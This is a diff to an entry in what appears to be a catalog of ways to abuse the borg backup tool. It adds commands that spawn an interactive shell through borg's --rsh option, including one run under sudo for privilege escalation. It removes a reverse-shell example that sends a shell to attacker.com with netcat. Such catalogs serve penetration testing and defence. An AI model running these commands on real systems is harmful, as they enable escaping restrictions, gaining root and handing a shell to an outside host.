@@ -1,9 +1,6 @@
 ---
+  shell:
+      code: borg extract @:/:::  --rsh "sh -c 'sh </dev/tty >/dev/tty 2>/dev/tty'"
   sudo:
-    - description: Run `nc -lvnp 12345` on the attacker box to receive the shell. 
-      code: |
-        RHOST=attacker.com
-        RPORT=12345
-        NETCAT=/usr/bin/nc
-        sudo borg extract .@.:/::.  --rsh "$NETCAT $RHOST $LHOST -e sh"
+      code: sudo borg extract @:/:::  --rsh "sh -c 'sh </dev/tty >/dev/tty 2>/dev/tty'"
 ---
